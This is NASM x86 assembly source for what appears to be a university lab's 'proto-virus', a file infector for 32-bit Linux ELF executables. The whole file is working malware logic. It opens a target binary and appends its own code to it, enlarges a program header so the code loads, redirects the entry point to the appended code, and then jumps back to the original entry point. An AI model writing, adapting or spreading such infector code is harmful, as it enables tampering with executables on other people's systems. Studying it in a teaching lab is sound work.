%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start
	global main
	
%define fd dword [ebp-4]
%define header ebp-56
%define virus_offset_in_file dword [ebp-60]
%define virus_size dword [ebp-64]
%define program_header ebp-128
%define original_entry ebp-132

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here

; write start msg

	call get_loc_ebx
	add ebx, start_message
	write 1, ebx, 14
	
; open the requested file
	
	call get_loc_ebx
	add ebx, FileName
	open ebx, RDWR, 0x777
	mov fd, eax   			; fd in eax
	cmp fd, 0    			; check if valid (non negative)
	jl error_exit
	
; read into the header 52 bytes from the start of the file
	
	lea ecx, [header]           ; pointer to input buffer 
	read fd, ecx, 52			; read 52 bytes into the header
	cmp eax, 52
	jne error_exit
	
; check magic numbers

	cmp dword[header], 0x464c457f
	jne error_exit
	
; save the originl entry point of the ELF file

	mov ebx, [header + ENTRY]
    mov [original_entry], ebx 
		
; compute the virus offset in the ELF file

	lseek fd, 0, SEEK_END		
	mov virus_offset_in_file, eax
	
; write the virus code at the end of the file

	call get_loc_ecx
    add ecx, _start       			; the virus code is from _start
	write fd, _start , virus_end - _start						 

; move to the program header offset in the ELF file

	lseek fd, [header+PHDR_start], SEEK_SET
	
; read the 2 program headers in the ELF file

	lea esi, [program_header]                                
	read fd, esi, 2*PHDR_size
    
; modify the sizes of the second program header

    mov edi, virus_end - _start
    add edi, virus_offset_in_file
    sub edi, [program_header+PHDR_size+PHDR_offset]
    mov [program_header+PHDR_size+PHDR_filesize], edi
    mov [program_header+PHDR_size+PHDR_memsize], edi

; write back the new second program header
    lseek fd, [header+PHDR_start], SEEK_SET
    lea esi, [program_header]
    write fd, esi, 2*PHDR_size
    
; compute the new entry point by the virtual address which written in the first program header
	
	;mov esi, virus_offset_in_file
	;add esi, 0x08048000
	mov esi, [program_header+PHDR_size+PHDR_vaddr]
    sub esi, [program_header+PHDR_size+PHDR_offset]
    add esi, virus_offset_in_file
    mov [header + ENTRY], esi          ; rewrite the new entry point at offset 24
    
; write the new header in the ELF file

	lseek fd, 0, SEEK_SET
	lea esi, [header]
	write fd, esi, 52
    
; write the original entry point in the return address of the ELF file

	;lseek fd, 0, SEEK_SET
    lseek fd, -4, SEEK_END
    lea ecx, [original_entry]
    write fd, ecx, 4
; close
	close fd


    call get_loc_ebx
    add ebx, PreviousEntryPoint        ;the file we want to open
    mov eax, [ebx]
    jmp eax

VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)                     
error_exit:
        call get_loc_ebx
		add ebx, PreviousEntryPoint
		jmp [ebx]
	
FileName:	db "ELFexec", 0
start_message:    db "This is virus", 10 ,0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

get_loc_ebx:
    call next_i_ebx
next_i_ebx:
    pop ebx
    sub ebx, next_i_ebx 
    ret

get_loc_ecx:
    call next_i_ecx
next_i_ecx:
    pop ecx
    sub ecx, next_i_ecx 
    ret

PreviousEntryPoint: dd VirusExit
virus_end:


